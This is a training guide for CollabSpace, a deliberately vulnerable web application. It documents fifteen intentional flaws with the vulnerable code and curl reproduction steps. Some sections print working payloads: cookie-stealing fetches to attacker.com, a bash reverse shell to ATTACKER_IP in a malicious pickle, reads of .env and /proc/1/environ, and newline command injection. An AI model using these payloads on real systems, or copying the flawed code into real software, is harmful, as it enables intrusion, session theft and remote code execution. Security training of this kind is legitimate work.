# CollabSpace — Vulnerabilities Reference Guide

> **FOR INTERNAL / TRAINING USE ONLY.** Do not deploy in production or expose to the internet.

This document details every intentional vulnerability in CollabSpace, its exact location, and step-by-step reproduction instructions. Difficulty is intentionally mixed for training realism: **2 very easy, 3 easy, 5 medium, 5 hard**.

---

## Vulnerability Index

| #  | Category | Name | Difficulty | Location |
|----|----------|------|-----------|----------|
| 1  | Injection | SQLi via unsanitised sort direction | Hard | `app/routers/tasks.py:38` |
| 2  | Injection | SQLi in project search (`q` parameter) | Medium | `app/routers/projects.py:87` |
| 3  | XSS | Stored XSS — weak comment sanitiser | Easy | `app/routers/comments.py:9` |
| 4  | XSS | Reflected XSS via JS string injection in search onclick | Medium | `app/templates/projects.html:149` |
| 5  | XSS | DOM-based XSS via weak hash filter in dashboard | Medium | `app/templates/dashboard.html` |
| 6  | Broken Access Control | IDOR via predictable user reference token | Easy | `app/routers/profile.py:41` |
| 7  | Broken Access Control | Privilege escalation via hidden nested `account_settings` | Medium | `app/routers/profile.py:91` |
| 8  | SSRF | Webhook SSRF — IP blocklist bypass via alternative representations | Hard | `app/routers/profile.py:110` |
| 9  | Path Traversal | Absolute-path override in `os.path.join` | Hard | `app/routers/files.py:72` |
| 10 | Command Injection | Newline character bypasses shell metachar filter | Hard | `app/routers/internal.py:65` |
| 11 | Broken Auth | JWT handling flaw — unhandled `alg:none` token | Hard | `app/auth.py:28` |
| 12 | Insecure Deserialisation | Unsafe `pickle.loads()` in file processing | Medium | `app/routers/files.py:124` |
| 13 | Broken Access Control | Missing admin check on analytics export | Very Easy | `app/routers/admin.py:87` |
| 14 | File Upload | Stored XSS via SVG avatar (weak extension blocklist) | Easy | `app/routers/profile.py:117` |
| 15 | Broken Auth | Password-reset token leaked in debug response | Very Easy | `app/routers/auth.py:88` |

---

## Detailed Reproduction Steps

---

### 1. SQLi — Sort Direction
**File:** `app/routers/tasks.py`, route `GET /api/tasks`
**Vulnerable code:**
```python
ALLOWED_COLUMNS = {"title", "status", "priority", "created_at", "updated_at"}
if sort_by not in ALLOWED_COLUMNS:
    sort_by = "created_at"
# BUG: direction is never validated
raw_sql = text(f"SELECT * FROM tasks ORDER BY {sort_by} {direction}")
```
**Why it's hard:** The `sort_by` column is allowlisted, so testers often stop there. The injection is in `direction`, which looks constrained to `ASC`/`DESC`.

**Step 1 — Confirm normal behavior:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/tasks?sort_by=title&direction=DESC"
```

**Step 2 — Confirm SQL expression injection in `direction`:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/tasks?sort_by=created_at&direction=ASC,%20(SELECT%201)"
# Expected: 200 OK with task list (payload accepted into ORDER BY)
```

**Step 3 — Trigger SQL error via stacked query payload:**
```bash
curl -i -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/tasks?sort_by=created_at&direction=ASC%3BSELECT%201"
# Expected: server-side SQL error (e.g., HTTP 500 / SQL exception), proving injection point
```

---

### 2. SQLi — Project Search
**File:** `app/routers/projects.py`, route `GET /api/projects/search?q=...`
**Vulnerable code:**
```python
# Input filters block obvious payloads, but query is still interpolated.
if any(fragment in q for fragment in [" union ", " select ", ...]):
    raise HTTPException(400, "Invalid search pattern")

raw_sql = f"""
    SELECT p.id, p.name, COALESCE(p.description, '') AS description
    FROM projects p
    ...
    AND p.name LIKE '%{q}%'
"""
rows = db.execute(text(raw_sql)).fetchall()
```
**Why it's medium:** Search applies basic input filtering, which blocks obvious SQLi strings. The SQL query still concatenates `q` directly, so obfuscated payloads can bypass the filter.

**Step 1 — Confirm the parameter without guessing:**
1. Log in and open `/projects`.
2. Type any term in the visible search box.
3. In browser DevTools > Network, observe request `GET /api/projects/search?q=<value>`.

**Step 2 — Confirm normal search works:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=Alpha"
```

**Step 3 — Show that obvious payloads are filtered:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=%27%20union%20select%20id,username,hashed_password%20FROM%20users--%20"
# Expected: HTTP 400 / "Invalid search pattern"
```

**Step 4 — Bypass filter with mixed-case obfuscation:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=%27%20UnIoN%20SeLeCt%20id,username,hashed_password%20FROM%20users--"
# Response .results includes user/hash rows
```

**Step 5 — Reusable payload:**
```
q payload:
' UnIoN SeLeCt id,username,hashed_password FROM users--
```

---

### 3. Stored XSS — Task Comments (Incomplete Sanitiser)
**File:** `app/routers/comments.py`, `sanitize_comment()` function; `app/templates/project_detail.html`
**Vulnerable code (sanitiser):**
```python
content = re.sub(r"<(script|iframe|object|embed|meta|link|base|style)...", "", content, flags=re.IGNORECASE)
content = re.sub(r"\bon(?:error|load|click|focus|mouseover|mouseenter|pointerenter)\s*=", "", content, flags=re.IGNORECASE)
# Still incomplete: many event handlers/tags remain (e.g. ontoggle)
```
**Why it's easy:** Common dangerous tags and handlers are filtered, but the sanitizer is still incomplete and leaves some executable attributes.

**Filtered payload examples (should NOT execute):**
```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.cookie)></svg>
```

**Working payloads (post as a task comment):**

```
<details open ontoggle=alert(document.domain)><summary>note</summary></details>
```

**Reproduce:**
1. Log in and open any project.
2. Click the comment button on a task.
3. Post one payload above.
4. Payload fires for every user who loads that task's comments.

---

### 4. Reflected XSS — JS String Injection in Search onclick
**File:** `app/templates/projects.html`, `searchProjects()` function
**Vulnerable code:**
```javascript
// data.query is inserted into an onclick JavaScript string without escaping
banner.innerHTML =
  `<span onclick="(document.getElementById('searchInput').value='${data.query}');searchProjects()">` +
  `Found <strong>${data.count}</strong> result(s) &mdash; click to re-run</span>`;
```
**Why it's medium:** The sink is a JavaScript string inside an HTML attribute. Exploitation requires quote breakout and user interaction with the rendered banner.

**Step 1 — Confirm the trigger path without guessing:**
1. Log in and open `/projects`.
2. Type any term in the visible search field.
3. Observe the request to `/api/projects/search?q=...` and the clickable results banner that is rendered from `data.query`.

**Step 2 — Confirm JS context injection (click required):**
Type in the search box (at least 2 characters):
```
');alert(document.domain);//
```
Expected: `onclick` becomes `onclick="(...value='');alert(document.domain);//');searchProjects()"`.
Click the banner text `Found <n> result(s) — click to re-run` to trigger execution.

**Step 3 — Working exfiltration PoC (click required):**
```
');fetch('https://attacker.com/?c='+document.cookie);//
```

**Step 4 — Delivery note:**
This reflected vector is tied to the search interaction flow and requires clicking the rendered banner (`onclick` handler). It is not a direct one-click URL payload on `/projects` by itself.

---

### 5. DOM-Based XSS — URL Fragment in Dashboard
**File:** `app/templates/dashboard.html`, inline script block
**Vulnerable code:**
```javascript
var hash = window.location.hash.slice(1);
if (hash) {
    var el = document.getElementById('quickFilterBanner');
    var decoded = decodeURIComponent(hash);
    decoded = decoded.replace(/<\s*\/?\s*script/gi, '');
    el.style.display = 'block';
    el.innerHTML = 'Active filter: <strong>' + decoded + '</strong>';
}
```
**Why it's medium:** A weak client-side filter strips only script-tag patterns before assigning to `innerHTML`, leaving non-script HTML/event payloads executable.

**Step 1 — Self-test:**
Navigate (while logged in) to:
```
http://localhost:8000/dashboard#<img src=x onerror=alert(document.cookie)>
```
Alert fires immediately on page load — no click or interaction required.

**Step 2 — Session hijacking via shared link:**
Send victim a link:
```
http://localhost:8000/dashboard#<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```
URL-encoded form for reliable delivery:
```
http://localhost:8000/dashboard#%3Cimg%20src%3Dx%20onerror%3D%22fetch('https%3A%2F%2Fattacker.com%2F%3Fc%3D'%2Bdocument.cookie)%22%3E
```

**Step 3 — Stored delivery via existing XSS chain:**
Chain with Vuln #3 (comment XSS): embed a `<a href>` pointing to the fragment URL, executed when the victim hovers/clicks.

---

### 6. IDOR — Predictable User Reference Token
**File:** `app/routers/profile.py`, route `GET /api/users/lookup?ref=<token>`
**Vulnerable code:**
```python
if ref.isdigit():
    user_id = int(ref)
else:
    user_id = int(base64.b64decode(ref.encode()).decode())
# No ownership check follows — any user can look up any other user
user = db.query(models.User).filter(models.User.id == user_id).first()
return { "id": ..., "email": ..., "role": ..., "api_key": user.api_key, ... }
```
**Why it's easy:** The lookup endpoint accepts predictable references and returns sensitive fields without ownership checks.

**Step 1 — Confirm endpoint and parameter without guessing:**
1. Open `/profile`.
2. Use the "User Directory" lookup widget.
3. In DevTools Network, observe `GET /api/users/lookup?ref=...`.

**Step 2 — Query by plain predictable ref:**
```bash
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/lookup?ref=1"
```

**Step 3 — Enumerate all users (numeric refs):**
```bash
for id in $(seq 1 20); do
  echo "=== User $id ==="
  curl -s -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/lookup?ref=$id"
  echo
done
```

**Step 4 — Use stolen API keys to authenticate as any user.**

---

### 7. Privilege Escalation — Hidden Nested `account_settings` Parameter
**File:** `app/routers/profile.py`, route `PUT /api/profile/update`
**Vulnerable code:**
```python
allowed_fields = ["full_name", "bio"]   # role removed from top-level
...
if "account_settings" in data and isinstance(data["account_settings"], dict):
    level_map = {"standard": "member", "elevated": "admin", "restricted": "viewer"}
    requested_level = data["account_settings"].get("_permission_level")
    if requested_level in level_map:
        current_user.role = level_map[requested_level]
```
**Why it's medium:** Top-level updates appear restricted, but a nested `account_settings` key still maps directly to privileged roles.

**Step 1 — Escalate to admin:**
```bash
curl -X PUT -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/update" \
  -H "Content-Type: application/json" \
  -d '{"bio": "hello", "account_settings": {"_permission_level": "elevated"}}'
```

**Step 2 — Verify escalation:**
```bash
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/auth/me"
# "role": "admin"
```

---

### 8. SSRF — Webhook Blocklist Bypass via Alternative IP Representations
**File:** `app/routers/profile.py`, route `POST /api/profile/webhook/test`
**Vulnerable code:**
```python
_WEBHOOK_BLOCKED_HOSTS = {"localhost","127.0.0.1","0.0.0.0","::1","169.254.169.254",...}
parsed = urlparse(webhook_url)
hostname = (parsed.hostname or "").lower()
if hostname in _WEBHOOK_BLOCKED_HOSTS:
    raise HTTPException(400, "Internal or reserved URLs are not permitted")
```
**Why it's hard:** There is an explicit internal-host blocklist, so exploitation requires alternative IP/host representations and SSRF chaining.

**Bypass options:**
| Representation | Value |
|---|---|
| Decimal | `2130706433` = `127.0.0.1` |
| Hex | `0x7f000001` |
| Short form | `127.1` |

**Step 1 — Confirm SSRF via decimal localhost representation:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/webhook/test" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2130706433:8000/api/internal/update-config?key=VERSION&value=9.9.9"}'
# Example: {"status":200,"response":"{\"message\":\"Configuration VERSION updated successfully\"}"}
```

**Step 2 — Confirm SSRF via hex localhost representation:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/webhook/test" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://0x7f000001:8000/api/internal/update-config?key=VERSION&value=10.0.0"}'
```

**Step 3 — Validate side-effect occurred:**
```bash
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/internal/health"
# Returned JSON shows updated VERSION value
```

---

### 9. Path Traversal — Absolute Path via `os.path.join` Semantics
**File:** `app/routers/files.py`, route `GET /api/files/{file_id}/download?path=`
**Vulnerable code:**
```python
if ".." in path:
    raise HTTPException(400, "Invalid path")
# BUG: os.path.join('/app/uploads', '/etc/passwd') == '/etc/passwd' on POSIX
file_path = os.path.join(settings.UPLOAD_DIR, path)
return FileResponse(path=file_path, ...)
```
**Why it's hard:** A naive traversal filter blocks `..`, so exploitation depends on absolute-path override behavior in `os.path.join`.

**Step 1 — Read a sensitive file (no `..` needed):**
```bash
# Read the application secret key configuration
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/app/app/config.py" \
  --output config.py

# Read the .env file
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/app/.env" \
  --output env.txt

# Read /etc/passwd
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/etc/passwd" \
  --output passwd.txt
```

**Step 2 — Extract the database password from the environment:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/proc/1/environ" \
  --output environ.bin
strings environ.bin | grep -i pass
```

---

### 10. Command Injection — Newline Character Bypasses Metachar Filter
**File:** `app/routers/internal.py`, route `POST /api/internal/backup?path=`
**Vulnerable code:**
```python
_BLOCKED = [";", "|", "&", "`", "$(", ">", "<"]
for ch in _BLOCKED:
    if ch in path:
        raise HTTPException(400, ...)
# BUG: \n (0x0a) is not blocked and is transformed into a shell separator
command = f"pg_dump ... > {path}"
command = command.replace("\n", " & ")
subprocess.run(command, shell=True, ...)
```
**Why it's hard:** Common metacharacters are blocked; successful injection relies on newline command separation with `shell=True`.

**Step 1 — Confirm injection:**
```bash
# Newline-separated command execution without blocked metacharacters
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/internal/backup?path=backup.sql%0Awhoami"
# Expected: response JSON contains current OS user in "output"
```

**Step 2 — Execute a second arbitrary command through newline injection:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/internal/backup?path=backup.sql%0Aecho%20PWNED_FROM_NEWLINE"
# Expected: "output" includes PWNED_FROM_NEWLINE
```

**Step 3 — Impact:** arbitrary command execution in server context.

---

### 11. JWT Handling Flaw — Unhandled `alg:none` Token Causes Server Error
**File:** `app/auth.py`, `decode_access_token()`
**Vulnerable code:**
```python
payload = jwt.decode(token, settings.SECRET_KEY, algorithms=["HS256", "none"])
```
**Why it's hard:** The code tries to support multiple algorithms but only catches `JWTError`; malformed/unsupported token handling can crash auth flow.

**Step 1 — Craft an unsigned token with `alg:none` (Python):**
```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "alice", "exp": 9999999999}).encode())
token   = f"{header}.{payload}."

print(token)
```

**Step 2 — Send token to authenticated endpoint:**
```bash
curl -i -b "token=<FORGED_TOKEN>" "http://localhost:8000/api/auth/me"
# Expected: server error (HTTP 500 / auth exception), proving malformed JWT handling bug
```

---

### 12. Insecure Deserialisation — Python Pickle
**File:** `app/routers/files.py`, route `POST /api/files/process?file_id=`
**Vulnerable code:**
```python
elif fname.endswith('.pkl') or fname.endswith('.pickle'):
    import pickle
    with open(file_record.filepath, 'rb') as f:
        raw = f.read()
    obj = pickle.loads(raw)   # BUG: arbitrary code execution
    return {"message": "Report loaded", ...}
```
**Why it's medium:** The vulnerable branch is extension-driven (`.pkl`/`.pickle`) and requires crafting a malicious serialized object.

**Step 1 — Create a malicious pickle:**
```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/rce_proof.txt",))

with open("exploit.pkl", "wb") as f:
    pickle.dump(Exploit(), f)
```

**Step 2 — Upload the pickle to any project:**
```bash
PROJECT_ID=1
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/upload?project_id=$PROJECT_ID" \
  -F "file=@exploit.pkl"
# Note the returned file id (e.g. 42)
```

**Step 3 — Trigger deserialisation:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/process?file_id=42"
# Server executes os.system("id > /tmp/rce_proof.txt")
```

**Step 4 — Confirm RCE:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/tmp/rce_proof.txt"
```

**Reverse shell payload:**
```python
class Exploit(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))
```

---

### 13. Broken Function-Level Authorization — Analytics Export
**File:** `app/routers/admin.py`, route `GET /api/analytics/export`
**Vulnerable code:**
```python
@router.get("/api/analytics/export")
async def export_analytics(
    current_user: models.User = Depends(get_current_active_user),  # should be require_admin
    ...
):
```
**Why it's very easy:** The endpoint lacks admin authorization, so any authenticated user can dump full data directly.

**Reproduce:**
```bash
# As any authenticated (non-admin) member account
curl -b "token=<MEMBER_TOKEN>" \
  "http://localhost:8000/api/analytics/export"

# Response includes all users' emails, roles, and API keys:
# {"users": [{"id":1,"username":"admin","email":"admin@collabspace.io","role":"admin","api_key":"..."},...],"projects":[...]}
```

---

### 14. Stored XSS via SVG Avatar — Incomplete Extension Blocklist
**File:** `app/routers/profile.py`, route `POST /api/profile/avatar`; `app/templates/profile.html`
**Vulnerable code:**
```python
_BLOCKED_AVATAR_EXTENSIONS = {'.php','.php3','.php4','.php5','.phtml','.py','.sh','.exe','.bat','.cmd'}
ext = os.path.splitext(filename)[1].lower()
if ext in _BLOCKED_AVATAR_EXTENSIONS:
    raise HTTPException(400, "File type not permitted")
# .svg is NOT in the blocklist
```
```html
{% if '.svg' in (user.avatar|lower) %}
<object data="{{ user.avatar }}" type="image/svg+xml" class="avatar-img"></object>
{% endif %}
```
**Why it's easy:** Server-side avatar validation is weak and still permits SVG uploads, enabling straightforward stored XSS.

**Step 1 — Create a malicious SVG:**
```xml
<!-- evil.svg -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <text x="10" y="20">Profile Picture</text>
</svg>
```

**Step 2 — Bypass the client-side `accept="image/*"` restriction and upload:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/avatar" \
  -F "file=@evil.svg;type=image/svg+xml"
```

**Step 3 — Trigger XSS:**
- Navigate to your profile page — the SVG is loaded via `<object>` and `onload` fires.
- If another user views your profile via the admin user lookup, the payload fires in their browser too.

**Step 4 — Persistent cookie-stealing payload:**
```xml
<svg xmlns="http://www.w3.org/2000/svg"
     onload="fetch('https://attacker.com/?c='+document.cookie)">
  <text x="10" y="20">Avatar</text>
</svg>
```

---

### 15. Password Reset Token — Leaked via Debug Response
**File:** `app/routers/auth.py`, route `POST /api/auth/reset-password`
**Vulnerable code:**
```python
if settings.DEBUG:
    response.headers["X-Debug-Token"] = reset_token
return {"message": "If the email exists, a reset link has been sent.", "debug_token": reset_token}
```
**Why it's very easy:** In debug mode, the reset token is leaked directly in both response headers and JSON response body.

**Step 1 — Request a reset and read the leaked token (body or header):**
```bash
curl -s -X POST "http://localhost:8000/api/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@collabspace.io"}'
# {"message":"...","debug_token":"472819"}

# Header variant:
curl -v -X POST "http://localhost:8000/api/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@collabspace.io"}' 2>&1 | grep -i "x-debug"
# < X-Debug-Token: 472819
```

**Step 2 — Use the leaked token to reset the password:**
```bash
curl -X POST "http://localhost:8000/api/auth/confirm-reset" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@collabspace.io", "token": "472819", "new_password": "H@ck3d123!"}'
```

**Step 3 — Log in with the new credentials:**
```bash
curl -c cookies.txt -X POST "http://localhost:8000/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "H@ck3d123!"}'
```

---

## Chained Attack Scenarios

### Scenario A: Unauthenticated → Admin → RCE
1. **Vuln #15** — `POST /api/auth/reset-password` on `admin@collabspace.io` → steal token from `X-Debug-Token` header → reset admin password → login
2. **Vuln #10** — `POST /api/internal/backup?path=backup.sql%0Awhoami` → confirm command execution
3. **Vuln #10** — execute follow-on commands via newline-injected payloads

### Scenario B: Member → Admin (No Interaction)
1. Register a member account
2. **Vuln #7** — `PUT /api/profile/update` with `{"account_settings":{"_permission_level":"elevated"}}` → become admin
3. Access all admin-only endpoints (`/api/admin/execute-query`, etc.)

### Scenario C: Persistent Account Takeover via XSS Chain
1. **Vuln #14** — upload `evil.svg` as avatar
2. Admin visits profile → SVG fires, steals admin cookie
3. Attacker authenticates as admin using stolen session cookie

### Scenario D: Blind Data Exfiltration
1. **Vuln #1** — SQLi on `GET /api/tasks?direction=` via injected ORDER BY expressions / stacked payloads
2. Use response and error behavior to map injectable SQL surface for follow-on exploitation

### Scenario E: SSRF → Internal Secrets → JWT Forgery
1. **Vuln #8** — `POST /api/profile/webhook/test` with decimal/hex localhost forms reaches internal APIs
2. Use SSRF to invoke sensitive internal endpoints (`/api/internal/update-config`, etc.)
3. **Vuln #11** — malformed `alg:none` token handling can destabilize auth endpoints (error-based abuse)

---

*This document is part of the CollabSpace security training platform.*



